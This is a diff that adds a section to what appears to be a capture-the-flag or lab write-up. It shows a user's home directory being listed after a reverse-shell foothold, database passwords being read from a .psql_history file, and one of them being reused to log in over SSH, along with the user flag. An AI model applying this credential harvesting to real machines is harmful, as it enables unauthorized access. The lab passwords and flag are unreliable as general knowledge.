@@ -116,7 +116,77 @@ After taking a quick search through the home directory we find a, "local.txt" fi
 
 ==User Flag (1st Flag):== **b3de70ea1913599228a4fd4b5385bcb5**
 
+Now that we have a foothold with the reverse shell on our target machine, we can verify the available files in the home directory:
+
+$ pwd
+/home/tom
+$ whoami
+tom
+$ ls -a
+.
+..
+.bash_history
+.cache
+.local
+.psql_history
+.sudo_as_admin_successful
+checkout.rb
+fetch.rb
+local.txt
+
+
+After individually opening each file with the cat command, we can find two user passwords in the, ".psql_history" file:
+
+$ cat .psql_history
+GRANT ALL PRIVILEGES ON DATABASE WEBLATE to WEBLATE;
+ALTER USER WEBLATE PASSWORD 'RapidlyLockstepDrenched103';
+q
+\q
+ALTER USER WEBLATE PASSWORD 'RollingShockingLifter231';
+\q
+
+We can give each command a try using the current "tom" login over SSH on the target machine:
+
+$ ssh tom@192.168.209.19
+The authenticity of host '192.168.209.19 (192.168.209.19)' can't be established.
+ED25519 key fingerprint is: SHA256:LK7VLnbj4lLQ8ZMsbqK9gqaAcJY+/+9sBXWGiSXj+LE
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.209.19' (ED25519) to the list of known hosts.
+tom@192.168.209.19's password: 
+Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-69-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed Aug 26 05:09:52 PM UTC 2026
+
+  System load:  0.0               Processes:               218
+  Usage of /:   87.7% of 8.02GB   Users logged in:         0
+  Memory usage: 39%               IPv4 address for ens192: 192.168.209.19
+  Swap usage:   11%
+
+  => / is using 87.7% of 8.02GB
+
+
+173 updates can be applied immediately.
+61 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+
+Last login: Fri Apr 25 12:34:29 2025 from 192.168.118.6
+==tom@fikklish:~$== 
+
+
+From the above we get a successful login with the combination:
+
+tom
+RapidlyLockstepDrenched103
+
+The other readily available password could still be useful in the future -> ollingShockingLifter231
 # Privilege Escalation
+
 
 
 
